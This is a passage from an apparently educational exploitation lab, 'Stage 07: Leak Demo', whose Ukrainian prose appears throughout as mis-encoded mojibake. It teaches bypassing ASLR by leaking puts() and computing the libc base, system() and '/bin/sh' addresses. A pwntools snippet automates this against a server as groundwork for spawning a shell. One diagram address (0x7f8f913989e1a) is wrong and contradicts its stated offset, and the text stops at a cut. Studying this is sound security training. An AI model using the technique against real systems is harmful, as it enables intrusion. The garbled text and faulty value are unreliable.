# Stage 07: Leak Demo - –í–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å –¥–ª—è –æ–±—Ö–æ–¥—É ASLR

## üéØ –ú–µ—Ç–∞ –∑–∞–≤–¥–∞–Ω–Ω—è

–ù–∞–≤—á–∏—Ç–∏—Å—è **–≤–∏—Ç—è–≥—É–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏** –∑ –ø—Ä–æ—Ü–µ—Å—É –¥–ª—è –æ–±—Ö–æ–¥—É ASLR (Address Space Layout Randomization). –¶–µ –∫—Ä–∏—Ç–∏—á–Ω–∏–π –Ω–∞–≤–∏–∫ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Å—É—á–∞—Å–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –¥–µ –≤—Å—ñ –∞–¥—Ä–µ—Å–∏ —Ä–∞–Ω–¥–æ–º—ñ–∑–æ–≤–∞–Ω—ñ.

## üìö –©–æ –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—å

- –©–æ —Ç–∞–∫–µ ASLR —ñ —á–æ–º—É –≤—ñ–Ω —É—Å–∫–ª–∞–¥–Ω—é—î –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é
- –©–æ —Ç–∞–∫–µ –≤–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ (address leak / information disclosure)
- –Ø–∫ —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ –±–∞–∑–æ–≤—É –∞–¥—Ä–µ—Å—É libc –∑ –≤–∏—Ç–æ–∫—É
- –©–æ —Ç–∞–∫–µ –æ—Ñ—Å–µ—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–π –≤ libc
- –†—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ –∞–¥—Ä–µ—Å–∞–º–∏ –≤ –±—ñ–Ω–∞—Ä–Ω–∏–∫—É —Ç–∞ –≤ –ø–∞–º'—è—Ç—ñ
- –¢–µ—Ö–Ω—ñ–∫–∞ "leak ‚Üí calculate base ‚Üí exploit"

## üîß –ù–µ–æ–±—Ö—ñ–¥–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

```bash
# Python —Ç–∞ pwntools
pip3 install pwntools

# ldd –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ libc
sudo apt install libc-bin

# readelf –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É ELF
sudo apt install binutils
```

## üìñ –¢–µ–æ—Ä–µ—Ç–∏—á–Ω–∞ –æ—Å–Ω–æ–≤–∞

### –©–æ —Ç–∞–∫–µ ASLR?

**ASLR (Address Space Layout Randomization)** - –º–µ—Ö–∞–Ω—ñ–∑–º –∑–∞—Ö–∏—Å—Ç—É –û–°, —è–∫–∏–π **—Ä–∞–Ω–¥–æ–º—ñ–∑—É—î** –∞–¥—Ä–µ—Å–∏ –≤ –ø–∞–º'—è—Ç—ñ –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–ø—É—Å–∫—É –ø—Ä–æ–≥—Ä–∞–º–∏.

**–ë–µ–∑ ASLR (—Å—Ç–∞—Ä—ñ —Å–∏—Å—Ç–µ–º–∏):**
```
–ó–∞–ø—É—Å–∫ 1:
  libc base: 0x7ffff7a00000
  puts():    0x7ffff7a809c0

–ó–∞–ø—É—Å–∫ 2:
  libc base: 0x7ffff7a00000  ‚Üê –¢–ê –°–ê–ú–ê!
  puts():    0x7ffff7a809c0  ‚Üê –¢–ê –°–ê–ú–ê!
```

**–ó ASLR (—Å—É—á–∞—Å–Ω—ñ —Å–∏—Å—Ç–µ–º–∏):**
```
–ó–∞–ø—É—Å–∫ 1:
  libc base: 0x7ffff7a00000
  puts():    0x7ffff7a809c0

–ó–∞–ø—É—Å–∫ 2:
  libc base: 0x7f8f91200000  ‚Üê –Ü–ù–®–ê!
  puts():    0x7f8f912809c0  ‚Üê –Ü–ù–®–ê!

–ó–∞–ø—É—Å–∫ 3:
  libc base: 0x7f12e3400000  ‚Üê –ó–ù–û–í–£ –Ü–ù–®–ê!
  puts():    0x7f12e34809c0  ‚Üê –ó–ù–û–í–£ –Ü–ù–®–ê!
```

### –ß–æ–º—É ASLR –ø—Ä–æ–±–ª–µ–º–∞?

–£ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –∑–∞–≤–¥–∞–Ω–Ω—è—Ö –º–∏ –∑–Ω–∞–ª–∏ —Ç–æ—á–Ω—ñ –∞–¥—Ä–µ—Å–∏:
```python
win_addr = 0x401136  # –ó–∞–≤–∂–¥–∏ —Ç–∞–∫–∞ —Å–∞–º–∞ –∞–¥—Ä–µ—Å–∞
```

–ó ASLR —Ü–µ –Ω–µ –ø—Ä–∞—Ü—é—î:
```python
system_addr = ???  # –ö–æ–∂–µ–Ω —Ä–∞–∑ —ñ–Ω—à–∞!
```

### –†—ñ—à–µ–Ω–Ω—è: –í–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏

–Ø–∫—â–æ –ø—Ä–æ–≥—Ä–∞–º–∞ **–≤–∏–≤–æ–¥–∏—Ç—å** –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó –∑ libc, –º–∏ –º–æ–∂–µ–º–æ:

1. **–í–∏—Ç—è–≥—Ç–∏** –∞–¥—Ä–µ—Å—É (leak)
2. **–†–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏** –±–∞–∑–æ–≤—É –∞–¥—Ä–µ—Å—É libc
3. **–ó–Ω–∞–π—Ç–∏** –ø–æ—Ç—Ä—ñ–±–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤—ñ–¥–Ω–æ—Å–Ω–æ –±–∞–∑–∏

```
       LEAK                CALCULATE              EXPLOIT
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê      ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –ü—Ä–æ–≥—Ä–∞–º–∞     ‚îÇ      ‚îÇ leaked_puts     ‚îÇ     ‚îÇ libc.base =  ‚îÇ
‚îÇ –≤–∏–≤–æ–¥–∏—Ç—å:    ‚îÇ  ‚Üí   ‚îÇ = 0x7fff...9c0  ‚îÇ  ‚Üí  ‚îÇ   leaked -   ‚îÇ
‚îÇ PUTS=0x...   ‚îÇ      ‚îÇ                 ‚îÇ     ‚îÇ   offset     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò      ‚îÇ offset_puts =   ‚îÇ     ‚îÇ              ‚îÇ
                      ‚îÇ 0x809c0 (–∑ —Ñ–∞–π–ª—É)‚îÇ     ‚îÇ system =     ‚îÇ
                      ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò     ‚îÇ base + 0x... ‚îÇ
                                              ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### –ê–Ω–∞—Ç–æ–º—ñ—è libc

**libc.so.6** - —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ C –∑ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏: `printf`, `puts`, `system`, etc.

## üî¨ –ê–Ω–∞—Ç–æ–º—ñ—è libc: —Ñ–∞–π–ª vs –ø–∞–º'—è—Ç—å (–î–ï–¢–ê–õ–¨–ù–û!)

–¶–µ **–ù–ê–ô–í–ê–ñ–õ–ò–í–Ü–®–ê –∫–æ–Ω—Ü–µ–ø—Ü—ñ—è** –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è leak —Ç–∞ –æ–±—Ö–æ–¥—É ASLR!

### –í—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—è –ø–æ–≤–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É:

```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë –ö–†–û–ö 1: –§–ê–ô–õ libc.so.6 –ù–ê –î–ò–°–ö–£                              ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë –†–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è: /lib/x86_64-linux-gnu/libc.so.6                ‚ïë
‚ïë                                                               ‚ïë
‚ïë ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê         ‚ïë
‚ïë ‚îÇ Offset 0x00000000 - ELF header                    ‚îÇ         ‚ïë
‚ïë ‚îÇ Offset 0x00001000 - .text (–∫–æ–¥)                   ‚îÇ         ‚ïë
‚ïë ‚îÇ   ...                                             ‚îÇ         ‚ïë
‚ïë ‚îÇ Offset 0x000809c0 - –§—É–Ω–∫—Ü—ñ—è puts()  ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îÇ         ‚ïë
‚ïë ‚îÇ   48 83 ec 08    sub    $0x8,%rsp          ‚îÇ   ‚îÇ         ‚ïë
‚ïë ‚îÇ   48 89 f8       mov    %rdi,%rax          ‚îÇ   ‚îÇ         ‚ïë
‚ïë ‚îÇ   ...                                      ‚îÇ   ‚îÇ         ‚ïë
‚ïë ‚îÇ   c3             ret                       ‚îÇ   ‚îÇ         ‚ïë
‚ïë ‚îÇ Offset 0x00050d70 - –§—É–Ω–∫—Ü—ñ—è system()       ‚îÇ   ‚îÇ         ‚ïë
‚ïë ‚îÇ Offset 0x00198e1a - –†—è–¥–æ–∫ "/bin/sh"        ‚îÇ   ‚îÇ         ‚ïë
‚ïë ‚îÇ   ...                                      ‚îÇ   ‚îÇ         ‚ïë
‚ïë ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îò         ‚ïë
‚ïë                                              ‚îÇ             ‚ïë
‚ïë –¶–Ü OFFSET'–ò –§–Ü–ö–°–û–í–ê–ù–Ü –¥–ª—è –¥–∞–Ω–æ—ó –≤–µ—Ä—Å—ñ—ó libc! ‚îÇ             ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï™‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
                                               ‚îÇ
         ASLR —Ä–∞–Ω–¥–æ–º—ñ–∑—É—î –ë–ê–ó–æ–≤—É –∞–¥—Ä–µ—Å—É        ‚îÇ
         –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–ø—É—Å–∫—É –ø—Ä–æ—Ü–µ—Å—É!         ‚îÇ
                        ‚ñº                      ‚îÇ
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë –ö–†–û–ö 2: libc.so.6 –ó–ê–í–ê–ù–¢–ê–ñ–ï–ù–û –í –ü–ê–ú'–Ø–¢–¨ (–ó–∞–ø—É—Å–∫ 1)          ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê            ‚ïë
‚ïë ‚îÇ –ë–∞–∑–æ–≤–∞ –∞–¥—Ä–µ—Å–∞: 0x7ffff7a00000  ‚óÑ‚îÄ‚îÄ –†–ê–ù–î–û–ú!    ‚îÇ            ‚ïë
‚ïë ‚îÇ                ‚ñ≤                               ‚îÇ            ‚ïë
‚ïë ‚îÇ                ‚îÇ ASLR –≤–∏–±—Ä–∞–ª–∞ –¶–Æ –∞–¥—Ä–µ—Å—É       ‚îÇ            ‚ïë
‚ïë ‚îÇ                ‚îÇ                               ‚îÇ            ‚ïë
‚ïë ‚îÇ 0x7ffff7a00000 + 0x809c0 = 0x7ffff7a809c0 ‚óÑ‚îÄ‚îê ‚îÇ            ‚ïë
‚ïë ‚îÇ   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   ‚îî‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ ‚îÇ            ‚ïë
‚ïë ‚îÇ       –±–∞–∑–∞        offset       puts –∞–¥—Ä–µ—Å–∞   ‚îÇ ‚îÇ            ‚ïë
‚ïë ‚îÇ                                               ‚îÇ ‚îÇ            ‚ïë
‚ïë ‚îÇ puts():    0x7ffff7a809c0  ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚î§ LEAKED!   ‚ïë
‚ïë ‚îÇ system():  0x7ffff7a50d70  (–±–∞–∑–∞ + 0x50d70)   ‚îÇ ‚îÇ            ‚ïë
‚ïë ‚îÇ "/bin/sh": 0x7ffff7b98e1a  (–±–∞–∑–∞ + 0x198e1a)  ‚îÇ ‚îÇ            ‚ïë
‚ïë ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ            ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï™‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
                                                     ‚îÇ
              –ü—Ä–æ–≥—Ä–∞–º–∞ –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω–∞                 ‚îÇ
              ASLR –≤–∏–±–∏—Ä–∞—î –Ü–ù–®–£ –±–∞–∑—É!               ‚îÇ
                        ‚ñº                           ‚îÇ
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë –ö–†–û–ö 3: libc.so.6 –ó–ê–í–ê–ù–¢–ê–ñ–ï–ù–û –í –ü–ê–ú'–Ø–¢–¨ (–ó–∞–ø—É—Å–∫ 2)          ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê            ‚ïë
‚ïë ‚îÇ –ë–∞–∑–æ–≤–∞ –∞–¥—Ä–µ—Å–∞: 0x7f8f91200000  ‚óÑ‚îÄ‚îÄ –Ü–ù–®–ê!      ‚îÇ            ‚ïë
‚ïë ‚îÇ                                                ‚îÇ            ‚ïë
‚ïë ‚îÇ 0x7f8f91200000 + 0x809c0 = 0x7f8f912809c0     ‚îÇ            ‚ïë
‚ïë ‚îÇ                                                ‚îÇ            ‚ïë
‚ïë ‚îÇ puts():    0x7f8f912809c0  ‚óÑ‚îÄ –Ü–ù–®–ê –∞–¥—Ä–µ—Å–∞!    ‚îÇ            ‚ïë
‚ïë ‚îÇ system():  0x7f8f91250d70                     ‚îÇ            ‚ïë
‚ïë ‚îÇ "/bin/sh": 0x7f8f913989e1a                    ‚îÇ            ‚ïë
‚ïë ‚îÇ                                                ‚îÇ            ‚ïë
‚ïë ‚îÇ –ê–õ–ï! Offset'–∏ –ù–ï–ó–ú–Ü–ù–ù–Ü:                        ‚îÇ            ‚ïë
‚ïë ‚îÇ   puts offset:    0x809c0  ‚óÑ‚îÄ‚îÄ –¢–ê –°–ê–ú–ê!       ‚îÇ            ‚ïë
‚ïë ‚îÇ   system offset:  0x50d70  ‚óÑ‚îÄ‚îÄ –¢–ê –°–ê–ú–ê!       ‚îÇ            ‚ïë
‚ïë ‚îÇ   "/bin/sh" offset: 0x198e1a  ‚óÑ‚îÄ‚îÄ –¢–ê –°–ê–ú–ê!    ‚îÇ            ‚ïë
‚ïë ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò            ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
```

## üßÆ –ú–∞—Ç–µ–º–∞—Ç–∏–∫–∞ leak (–ø–æ–∫—Ä–æ–∫–æ–≤–æ)

### –î–∞–Ω–æ:
1. **Leak –≤—ñ–¥ —Å–µ—Ä–≤–µ—Ä–∞:** `PUTS=0x7ffff7a809c0`
2. **Offset –∑ —Ñ–∞–π–ª—É:** `0x809c0` (–∑–Ω–∞–π–¥–µ–Ω–æ —á–µ—Ä–µ–∑ readelf)

### –ú–µ—Ç–∞:
–ó–Ω–∞–π—Ç–∏ –∞–¥—Ä–µ—Å—É `system()` —Ç–∞ `"/bin/sh"`

### –†–æ–∑–≤'—è–∑–æ–∫:

**–ö—Ä–æ–∫ 1: –§–æ—Ä–º—É–ª–∞ –∑–≤'—è–∑–∫—É**
```
leaked_puts = libc_base + offset_puts
```

**–ß–æ–º—É —Ü—è —Ñ–æ—Ä–º—É–ª–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–∞?**
- ASLR —Ä–∞–Ω–¥–æ–º—ñ–∑—É—î –¢–Ü–õ–¨–ö–ò –±–∞–∑–æ–≤—É –∞–¥—Ä–µ—Å—É
- Offset –í–°–ï–†–ï–î–ò–ù–Ü libc –Ω–µ–∑–º—ñ–Ω–Ω—ñ
- –¢–æ–º—É: —Ä–µ–∞–ª—å–Ω–∞_–∞–¥—Ä–µ—Å–∞ = –±–∞–∑–∞ + —Ñ—ñ–∫—Å–æ–≤–∞–Ω–∏–π_offset

**–ö—Ä–æ–∫ 2: –†–æ–∑–≤'—è–∑—É—î–º–æ –¥–ª—è libc_base**
```python
libc_base = leaked_puts - offset_puts
libc_base = 0x7ffff7a809c0 - 0x809c0
libc_base = 0x7ffff7a00000  ‚úì
```

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ (–∑–∞–≤–∂–¥–∏ —Ä–æ–±—ñ—Ç—å!):**
```python
# –û—Å—Ç–∞–Ω–Ω—ñ 3 hex —Ü–∏—Ñ—Ä–∏ –º–∞—é—Ç—å –±—É—Ç–∏ 000
hex(libc_base)  # 0x7ffff7a00000  ‚Üê –ó–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ 000 ‚úì

# libc –∑–∞–≤–∂–¥–∏ –≤–∏—Ä—ñ–≤–Ω—è–Ω–∞ –Ω–∞ PAGE_SIZE (–∑–∞–∑–≤–∏—á–∞–π 0x1000)
libc_base & 0xfff == 0  # True ‚úì
```

**–ö—Ä–æ–∫ 3: –ó–Ω–∞—Ö–æ–¥–∏–º–æ —ñ–Ω—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó**
```python
# Offset system (–∑ readelf):
offset_system = 0x50d70

# –†–µ–∞–ª—å–Ω–∞ –∞–¥—Ä–µ—Å–∞ system:
system_addr = libc_base + offset_system
system_addr = 0x7ffff7a00000 + 0x50d70
system_addr = 0x7ffff7a50d70  ‚úì
```

**–ö—Ä–æ–∫ 4: –ó–Ω–∞—Ö–æ–¥–∏–º–æ —Ä—è–¥–∫–∏**
```python
# Offset "/bin/sh" (–∑ strings + grep):
offset_binsh = 0x198e1a

# –†–µ–∞–ª—å–Ω–∞ –∞–¥—Ä–µ—Å–∞ "/bin/sh":
binsh_addr = libc_base + offset_binsh
binsh_addr = 0x7ffff7a00000 + 0x198e1a
binsh_addr = 0x7ffff7b98e1a  ‚úì
```

### –ü–æ–≤–Ω–∞ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –≤ exploit:

```python
from pwn import *

# –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ libc —Ñ–∞–π–ª
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Offset'–∏ –∑ —Ñ–∞–π–ª—É (–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ):
offset_puts = libc.symbols['puts']      # 0x809c0
offset_system = libc.symbols['system']  # 0x50d70

# Leak –≤—ñ–¥ —Å–µ—Ä–≤–µ—Ä–∞
io.sendline(b'LEAK')
line = io.recvline()  # b'PUTS=0x7ffff7a809c0\n'
leaked_puts = int(line.split(b'=')[1], 16)

# –†–æ–∑—Ä–∞—Ö—É–Ω–æ–∫ –±–∞–∑–∏
libc.address = leaked_puts - offset_puts
# libc.address —Ç–µ–ø–µ—Ä = 0x7ffff7a00000

# –í–°–Ü –∞–¥—Ä–µ—Å–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ–Ω–æ–≤–ª—é—é—Ç—å—Å—è!
system_addr = libc.symbols['system']    # 0x7ffff7a50d70
binsh_addr = next(libc.search(b'/bin/sh\x00'))  # 0x7ffff7b98e1a
```

## üîç –Ø–∫ –∑–Ω–∞–π—Ç–∏ offset –≤ libc? (–î–ï–¢–ê–õ–¨–ù–û)

### –ú–µ—Ç–æ–¥ 1: readelf (–ø–æ–∫—Ä–æ–∫–æ–≤–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è)

